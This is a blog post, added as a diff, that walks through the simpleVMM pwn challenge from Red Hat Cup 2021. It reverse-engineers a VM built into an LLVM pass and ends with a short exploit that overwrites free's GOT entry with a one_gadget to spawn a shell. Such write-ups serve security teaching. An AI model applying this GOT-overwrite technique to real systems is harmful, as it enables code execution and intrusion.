@@ -1,0 +1,336 @@
+---
+layout: post
+title:  simpleVMM(红帽杯2021)
+date:   2023-09-11 00:08:01 +0300
+image:  2023-09-11-volkswagen.jpg
+tags:   [ctf,pwn,llvm]
+---
+
+shift+F12查找字符串，可以看到`o0o0o0o0`，查看交叉引用，定位到关键函数
+
+```assembly
+__int64 __fastcall sub_6830(__int64 a1, llvm::Value *a2)
+{
+  __int64 v2; // rdx
+  bool v4; // [rsp+7h] [rbp-119h]
+  size_t v5; // [rsp+10h] [rbp-110h]
+  const void *v6; // [rsp+28h] [rbp-F8h]
+  __int64 v7; // [rsp+30h] [rbp-F0h]
+  int v8; // [rsp+94h] [rbp-8Ch]
+
+  v6 = (const void *)llvm::Value::getName(a2);
+  v7 = v2;
+  if ( "o0o0o0o0" )
+    v5 = strlen("o0o0o0o0");
+  else
+    v5 = 0LL;
+  v4 = 0;
+  if ( v7 == v5 )
+  {
+    if ( v5 )
+      v8 = memcmp(v6, "o0o0o0o0", v5);
+    else
+      v8 = 0;
+    v4 = v8 == 0;
+  }
+  if ( v4 )
+    sub_6AC0(a1, a2);
+  return 0LL;
+}
+```
+
+逻辑很简单，如果函数名等于o0o0o0o0则进入后续处理，不等于则什么都不做
+
+进入sub_6AC0函数
+
+```assembly
+unsigned __int64 __fastcall sub_6AC0(__int64 a1, llvm::Function *a2)
+{
+  llvm::BasicBlock *v3; // [rsp+20h] [rbp-30h]
+  __int64 v4; // [rsp+38h] [rbp-18h] BYREF
+  __int64 v5[2]; // [rsp+40h] [rbp-10h] BYREF
+
+  v5[1] = __readfsqword(0x28u);
+  v5[0] = llvm::Function::begin(a2);
+  while ( 1 )
+  {
+    v4 = llvm::Function::end(a2);
+    if ( (llvm::operator!=(v5, &v4) & 1) == 0 )
+      break;
+    v3 = (llvm::BasicBlock *)llvm::ilist_iterator<llvm::ilist_detail::node_options<llvm::BasicBlock,false,false,void>,false,false>::operator*(v5);
+    sub_6B80(a1, v3);
+    llvm::ilist_iterator<llvm::ilist_detail::node_options<llvm::BasicBlock,false,false,void>,false,false>::operator++(
+      v5,
+      0LL);
+  }
+  return __readfsqword(0x28u);
+}
+```
+
+这里的llvm::Function::begin和llvm::Function::end都是Function类的迭代器对象，其迭代的对象是函数中的基本块。因此这个循环的意思就是对每一个基本块执行sub_6B80函数。其中v3 = (llvm::BasicBlock *)llvm::ilist_iterator\<llvm::ilist_detail::node_options\<llvm::BasicBlock,false,false,void>,false,false>::operator\*(v5);这条语句中的ilist是LLVM标准库中定义的一个数据结构，与C++标准模板库list类似，但是LLVM中都是使用ilist来存储一个函数的所有基本块或指令，可以将其看成一个列表，针对于LLVM做了一些特殊的优化。那么v3也就是函数中的每一个基本块。
+
+进入sub_6B80函数
+
+```assembly
+__int64 __fastcall sub_6B80(__int64 a1, llvm::BasicBlock *a2)
+{
+  llvm::Value *v2; // rax
+  void **v3; // rax
+  void **v4; // rax
+  llvm::ConstantInt *v6; // [rsp+18h] [rbp-1B8h]
+  __int64 v7; // [rsp+20h] [rbp-1B0h]
+  __int64 v8; // [rsp+28h] [rbp-1A8h]
+  llvm::ConstantInt *v9; // [rsp+30h] [rbp-1A0h]
+  _QWORD *v10; // [rsp+38h] [rbp-198h]
+  __int64 v11; // [rsp+40h] [rbp-190h]
+  llvm::ConstantInt *v12; // [rsp+50h] [rbp-180h]
+  __int64 v13; // [rsp+58h] [rbp-178h]
+  __int64 v14; // [rsp+60h] [rbp-170h]
+  llvm::ConstantInt *v15; // [rsp+68h] [rbp-168h]
+  _QWORD *v16; // [rsp+70h] [rbp-160h]
+  __int64 v17; // [rsp+78h] [rbp-158h]
+  __int64 v18; // [rsp+A0h] [rbp-130h]
+  llvm::ConstantInt *v19; // [rsp+A8h] [rbp-128h]
+  void *v20; // [rsp+B0h] [rbp-120h]
+  __int64 v21; // [rsp+B8h] [rbp-118h]
+  __int64 v22; // [rsp+E0h] [rbp-F0h]
+  llvm::ConstantInt *v23; // [rsp+E8h] [rbp-E8h]
+  void *v24; // [rsp+F0h] [rbp-E0h]
+  __int64 v25; // [rsp+F8h] [rbp-D8h]
+  __int64 v26; // [rsp+110h] [rbp-C0h]
+  llvm::ConstantInt *v27; // [rsp+118h] [rbp-B8h]
+  _QWORD *v28; // [rsp+120h] [rbp-B0h]
+  __int64 v29; // [rsp+128h] [rbp-A8h]
+  __int64 v30; // [rsp+140h] [rbp-90h]
+  llvm::ConstantInt *v31; // [rsp+148h] [rbp-88h]
+  _QWORD *v32; // [rsp+150h] [rbp-80h]
+  __int64 v33; // [rsp+158h] [rbp-78h]
+  char *s1; // [rsp+168h] [rbp-68h]
+  llvm::CallBase *v35; // [rsp+170h] [rbp-60h]
+  llvm::Instruction *v36; // [rsp+180h] [rbp-50h]
+  _QWORD *v37; // [rsp+1A8h] [rbp-28h]
+  __int64 v38; // [rsp+1B8h] [rbp-18h] BYREF
+  __int64 v39[2]; // [rsp+1C0h] [rbp-10h] BYREF
+
+  v39[1] = __readfsqword(0x28u);
+  v39[0] = llvm::BasicBlock::begin(a2);
+  while ( 1 )
+  {
+    v38 = llvm::BasicBlock::end(a2);
+    if ( (llvm::operator!=(v39, &v38) & 1) == 0 )
+      break;
+    v36 = (llvm::Instruction *)llvm::dyn_cast<llvm::Instruction,llvm::ilist_iterator<llvm::ilist_detail::node_options<llvm::Instruction,false,false,void>,false,false>>(v39);
+    if ( (unsigned int)llvm::Instruction::getOpcode(v36) == 0x37 )
+    {
+      v35 = (llvm::CallBase *)llvm::dyn_cast<llvm::CallInst,llvm::Instruction>(v36);
+      if ( v35 )
+      {
+        s1 = (char *)malloc(0x20uLL);
+        v2 = (llvm::Value *)llvm::CallBase::getCalledFunction(v35);
+        v37 = (_QWORD *)llvm::Value::getName(v2);
+        *(_QWORD *)s1 = *v37;
+        *((_QWORD *)s1 + 1) = v37[1];
+        *((_QWORD *)s1 + 2) = v37[2];
+        *((_QWORD *)s1 + 3) = v37[3];
+        if ( !strcmp(s1, "pop") )
+        {
+          if ( (unsigned int)llvm::CallBase::getNumOperands(v35) == 2 )
+          {
+            v33 = llvm::CallBase::getArgOperand(v35, 0);
+            v32 = 0LL;
+            v31 = (llvm::ConstantInt *)llvm::dyn_cast<llvm::ConstantInt,llvm::Value>(v33);
+            if ( v31 )
+            {
+              v30 = llvm::ConstantInt::getZExtValue(v31);
+              if ( v30 == 1 )
+                v32 = off_20DFD0;
+              if ( v30 == 2 )
+                v32 = off_20DFC0;
+            }
+            if ( v32 )
+            {
+              v3 = off_20DFD8;
+              *v32 = *(_QWORD *)*off_20DFD8;
+              *v3 = (char *)*v3 + 0xFFFFFFF8;
+            }
+          }
+        }
+        else if ( !strcmp(s1, "push") )
+        {
+          if ( (unsigned int)llvm::CallBase::getNumOperands(v35) == 2 )
+          {
+            v29 = llvm::CallBase::getArgOperand(v35, 0);
+            v28 = 0LL;
+            v27 = (llvm::ConstantInt *)llvm::dyn_cast<llvm::ConstantInt,llvm::Value>(v29);
+            if ( v27 )
+            {
+              v26 = llvm::ConstantInt::getZExtValue(v27);
+              if ( v26 == 1 )
+                v28 = off_20DFD0;
+              if ( v26 == 2 )
+                v28 = off_20DFC0;
+            }
+            if ( v28 )
+            {
+              v4 = off_20DFD8;
+              *off_20DFD8 = (char *)*off_20DFD8 + 8;
+              *(_QWORD *)*v4 = *v28;
+            }
+          }
+        }
+        else if ( !strcmp(s1, "store") )
+        {
+          if ( (unsigned int)llvm::CallBase::getNumOperands(v35) == 2 )
+          {
+            v25 = llvm::CallBase::getArgOperand(v35, 0);
+            v24 = 0LL;
+            v23 = (llvm::ConstantInt *)llvm::dyn_cast<llvm::ConstantInt,llvm::Value>(v25);
+            if ( v23 )
+            {
+              v22 = llvm::ConstantInt::getZExtValue(v23);
+              if ( v22 == 1 )
+                v24 = off_20DFD0;
+              if ( v22 == 2 )
+                v24 = off_20DFC0;
+            }
+            if ( v24 == off_20DFD0 )
+            {
+              **(_QWORD **)off_20DFD0 = *(_QWORD *)off_20DFC0;
+            }
+            else if ( v24 == off_20DFC0 )
+            {
+              **(_QWORD **)off_20DFC0 = *(_QWORD *)off_20DFD0;
+            }
+          }
+        }
+        else if ( !strcmp(s1, "load") )
+        {
+          if ( (unsigned int)llvm::CallBase::getNumOperands(v35) == 2 )
+          {
+            v21 = llvm::CallBase::getArgOperand(v35, 0);
+            v20 = 0LL;
+            v19 = (llvm::ConstantInt *)llvm::dyn_cast<llvm::ConstantInt,llvm::Value>(v21);
+            if ( v19 )
+            {
+              v18 = llvm::ConstantInt::getZExtValue(v19);
+              if ( v18 == 1 )
+                v20 = off_20DFD0;
+              if ( v18 == 2 )
+                v20 = off_20DFC0;
+            }
+            if ( v20 == off_20DFD0 )
+              *(_QWORD *)off_20DFC0 = **(_QWORD **)off_20DFD0;
+            if ( v20 == off_20DFC0 )
+              *(_QWORD *)off_20DFD0 = **(_QWORD **)off_20DFC0;
+          }
+        }
+        else if ( !strcmp(s1, "add") )
+        {
+          if ( (unsigned int)llvm::CallBase::getNumOperands(v35) == 3 )
+          {
+            v17 = llvm::CallBase::getArgOperand(v35, 0);
+            v16 = 0LL;
+            v15 = (llvm::ConstantInt *)llvm::dyn_cast<llvm::ConstantInt,llvm::Value>(v17);
+            if ( v15 )
+            {
+              v14 = llvm::ConstantInt::getZExtValue(v15);
+              if ( v14 == 1 )
+                v16 = off_20DFD0;
+              if ( v14 == 2 )
+                v16 = off_20DFC0;
+            }
+            if ( v16 )
+            {
+              v13 = llvm::CallBase::getArgOperand(v35, 1u);
+              v12 = (llvm::ConstantInt *)llvm::dyn_cast<llvm::ConstantInt,llvm::Value>(v13);
+              if ( v12 )
+                *v16 += llvm::ConstantInt::getZExtValue(v12);
+            }
+          }
+        }
+        else if ( !strcmp(s1, "min") && (unsigned int)llvm::CallBase::getNumOperands(v35) == 3 )
+        {
+          v11 = llvm::CallBase::getArgOperand(v35, 0);
+          v10 = 0LL;
+          v9 = (llvm::ConstantInt *)llvm::dyn_cast<llvm::ConstantInt,llvm::Value>(v11);
+          if ( v9 )
+          {
+            v8 = llvm::ConstantInt::getZExtValue(v9);
+            if ( v8 == 1 )
+              v10 = off_20DFD0;
+            if ( v8 == 2 )
+              v10 = off_20DFC0;
+          }
+          if ( v10 )
+          {
+            v7 = llvm::CallBase::getArgOperand(v35, 1u);
+            v6 = (llvm::ConstantInt *)llvm::dyn_cast<llvm::ConstantInt,llvm::Value>(v7);
+            if ( v6 )
+              *v10 -= llvm::ConstantInt::getZExtValue(v6);
+          }
+        }
+        free(s1);
+      }
+    }
+    llvm::ilist_iterator<llvm::ilist_detail::node_options<llvm::Instruction,false,false,void>,false,false>::operator++(
+      v39,
+      0LL);
+  }
+  return 1LL;
+}
+```
+
+这个函数遍历了o0o0o0o0函数的每一个basicblock，取出每个basicblock然后送进函数中进行进一步处理
+
+使用了一个大循环对基本块进行遍历。这里的v36变量是从v39变量dyn_cast过来的，这是一个llvm定义的类型转换。这里是将v36转换成了Instruction指令对象，然后获取了这个指令的指令码getOpcode(v36)。查看源码发现其指令码定义保存在llvm/IR/Instruction.def文件中，上面的代码意思是指令码需要为55才能进入下一步操作，否则就会直接跳过这个指令去处理下一条指令。我们看一下llvm/IR/Instruction.def文件中Call指令的指令码为55。
+
+由此我们可以猜测出v35变量的CallBase指针类型实际上也就是函数调用的对象。源码中的注释说，CallBase对象是所有可以调用的指令的基类，这里“可以调用的指令”包含InvokeInst和CallInst。所有调用的指令都含有：调用的函数自身、零或若干个参数、零或若干个操作数组以及零或若干个操作数输入 （原文是operand bundle，笔者不确定这里指的是不是数组的意思，如有错误还请读者指正）
+
+下面的getCalledFunction就是获取函数本身，将函数名拷贝到了变量s1中，下面判断函数名是否是pop，如果是判断getNumOperands()函数的结果是不是2。这里需要注意的是，getNumOperands()函数并不是返回函数参数的个数，而是返回一条指令中的变量个数。注意这里的v35变量类型是CallBase，是指令Instructions的子类，与CalledFunction变量的类型完全不同。随便截取一段.ll文件的代码可以看到call后面会跟上变量名，变量名之前加上@符号说明llvm将其认为是一个变量。因此在这里其实际返回的值应该是函数参数的个数+1。
+
+pop函数的参数个数应该是1。之后进入内部调用了getArgOperand函数，这个函数是用来返回被调用的函数的第一个实参的值，然后v31变量赋值为这个值，并以ConstantInt即整型常量的类型保存。如果这个值不为0，那么再次进行转换，getZExtValue这个函数，通过函数名猜测其功能：get Zero Extended Value，即无符号扩展整数。其为1或2时v32变量指向两段内存的地址，这两段内存分别被命名为reg1和reg2。后面又将v3变量赋值为某段内存的二重指针（因为stackdoubleptr变量保存的是一个指针指向内存空间，因此这里表示其为二重指针）。那一段内存空间被命名为stack。这样看起来程序中有一个小的vm，有虚拟出来的寄存器和栈，算是和vm题很像了。而且这里的操作也和汇编的pop指令完全相同，将栈顶的值赋值给reg1或reg2，然后栈指针下移8。因此这个vm中栈底在低地址，而栈顶在高地址，与汇编中的栈排列相反。
+
+min函数减法操作，有2个参数，第一个参数指定寄存器，第二个参数是要减去的数值。
+
+一开始，reg1、reg2、stack中所有的值都为0，由于本题中opt-8程序没有开启PIE保护，因此其加载基址固定不变，我们可以利用这个获取到其got表中的地址，将其拷贝到reg或stack中。然后在此基础上计算出one_gadget的地址，将其写回到got表，即可执行one_gadget，逻辑很简单。
+
+在这里，我们选择free函数作为地址覆盖的对象，找到opt程序中free函数got表的位置为0x77E100。因此o0o0o0o0函数的第一条语句应该是：add(1, 0x77E100);。然后使用load函数将got表中地址值保存到另一个寄存器中：load(1);。现在我们想要的地址在reg2中，加上相应的one_gadget偏移。
+
+onegadget
+
+```assembly
+0xe3afe execve("/bin/sh", r15, r12)
+constraints:
+  [r15] == NULL || r15 == NULL
+  [r12] == NULL || r12 == NULL
+
+0xe3b01 execve("/bin/sh", r15, rdx)
+constraints:
+  [r15] == NULL || r15 == NULL
+  [rdx] == NULL || rdx == NULL
+
+0xe3b04 execve("/bin/sh", rsi, rdx)
+constraints:
+  [rsi] == NULL || rsi == NULL
+  [rdx] == NULL || rdx == NULL
+```
+
+exp
+
+```assembly
+void o0o0o0o0();
+void pop(int reg){};
+void push(int reg){};
+void store(int reg){};
+void load(int reg){};
+void add(int reg, int val){};
+void min(int reg, int val){};
+
+void o0o0o0o0(){
+	add(1, 0x77E100);
+	load(1);
+	add(2, 0x4942e);
+	store(1);
+}
+```
+
